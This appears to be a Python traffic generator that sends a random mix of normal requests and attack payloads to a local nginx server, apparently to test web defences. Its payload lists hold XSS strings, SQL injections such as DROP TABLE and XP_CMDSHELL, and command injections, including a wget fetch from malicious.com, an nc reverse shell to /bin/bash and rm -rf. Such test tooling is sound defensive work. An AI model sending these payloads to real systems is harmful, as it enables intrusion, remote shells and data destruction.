import requests
import random
import string
import time

# Define the target server
NGINX_SERVER_URL = "http://localhost"

# Random string generator for fuzzing
def random_string(length=10):
    """
    Generate a random alphanumeric string of the given length.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Define request templates with placeholders for randomization
NORMAL_REQUESTS = [
    "/index.html",
    f"/search?q={random_string()}",
    f"/login?user={random_string()}&password={random_string()}",
    f"/api/data?item={random.randint(1, 10000)}",
    "/home",
    f"/profile?user={random_string()}"
]

XSS_PAYLOADS = [
    f"/?id=<script>alert('{random_string()}')</script>",
    f"/?id=<img src=x onerror=alert('{random_string()}')>",
    f"/?id=<a href='javascript:alert(\"{random_string()}\")'>Click</a>",
    f"/?id=<script>document.cookie</script>",
    f"/?id=<div onclick=\"alert('{random_string()}')\">Click me</div>"
]

SQLI_PAYLOADS = [
    f"/?id=1' OR '{random_string()}'='{random_string()}'",
    f"/?id=1; DROP TABLE {random_string()};",
    f"/?id=1 UNION SELECT {random_string()}, {random_string()} FROM {random_string()}",
    f"/?id=1 OR 1={random.randint(1, 10)}",
    f"/?id=1; EXEC XP_CMDSHELL('dir {random_string()}')",
    f"/?id=1; WAITFOR DELAY '0:0:{random.randint(1, 30)}'",
    f"/?id=1; DECLARE @{random_string()} INT",
    f"/?id=1; SELECT * FROM {random_string()} WHERE id=1"
]

COMMAND_INJECTION_PAYLOADS = [
    f"/?id=1; {random_string()}",
    f"/?id=1 && echo {random_string()}",
    f"/?id=1 || wget http://malicious.com/{random_string()}.sh",
    f"/?id=1 | nc {random_string()}.com 4444 -e /bin/bash",
    f"/?id=1 `rm -rf /{random_string()}`",
    f"/?id=$(rm -rf /{random_string()})"
]

# Function to generate random request
def generate_random_request():
    request_type = random.choice(["normal", "xss", "sqli", "command_injection"])
    payload = ""
    if request_type == "normal":
        payload = random.choice(NORMAL_REQUESTS)
    elif request_type == "xss":
        payload = random.choice(XSS_PAYLOADS)
    elif request_type == "sqli":
        payload = random.choice(SQLI_PAYLOADS)
    elif request_type == "command_injection":
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
    return payload, request_type

# Function to send requests
def send_request(url, payload, request_type):
    full_url = f"{url}{payload}"
    try:
        print(f"Sending {request_type} request: {full_url}")
        response = requests.get(full_url, timeout=5)
        print(f"Response status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send request: {e}")

# Main loop to send requests at ~3 requests/sec
def main():
    while True:
        payload, request_type = generate_random_request()
        send_request(NGINX_SERVER_URL, payload, request_type)
        # Randomize the interval to ~3 requests/sec
        time.sleep(random.uniform(0.1, 1))

if __name__ == "__main__":
    main()

